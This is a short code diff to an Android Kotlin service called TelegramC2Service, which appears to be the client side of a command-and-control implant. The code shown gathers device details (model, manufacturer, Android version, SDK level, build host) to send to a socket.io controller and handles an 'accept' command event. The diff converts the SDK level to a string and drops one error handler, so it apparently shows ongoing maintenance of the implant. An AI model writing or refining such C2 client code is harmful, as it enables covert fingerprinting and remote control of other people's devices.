@@ -188,7 +188,7 @@ class TelegramC2Service : Service() {
                     "model" to Build.MODEL,
                     "manufacturer" to Build.MANUFACTURER,
                     "android_version" to Build.VERSION.RELEASE,
-                    "sdk_int" to Build.VERSION.SDK_INT,
+                    "sdk_int" to Build.VERSION.SDK_INT.toString(),
                     "hostname" to Build.HOST,
                 )
                 path = "/socket.io"
@@ -209,10 +209,6 @@ class TelegramC2Service : Service() {
                 val msg = args.firstOrNull()?.toString() ?: "?"
                 log("socket error: $msg")
                 connected = false
-            }
-            s.on(Socket.EVENT_ERROR) { args ->
-                val msg = args.firstOrNull()?.toString() ?: "?"
-                log("socket event error: $msg")
             }
             s.on("accept") { args ->
                 val obj = args.firstOrNull() as? JSONObject ?: return@on
